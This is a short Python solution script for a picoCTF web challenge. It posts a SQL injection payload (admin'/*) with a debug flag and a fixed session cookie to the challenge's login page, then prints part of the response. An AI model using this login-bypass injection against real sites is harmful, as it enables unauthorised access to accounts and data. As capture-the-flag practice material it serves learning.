#!/usr/bin/python
import requests

url = 'https://jupiter.challenges.picoctf.org/problem/64649/login.php'

data = 'username=admin%27%2F*&password=admasd&debug=1'
header = {
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie':'PHPSESSID=1rsokea65lmfuu3hrgpff6ue7p',
        }
p = requests.post(url, data=data, headers=header)
print(p.text)[158:188]
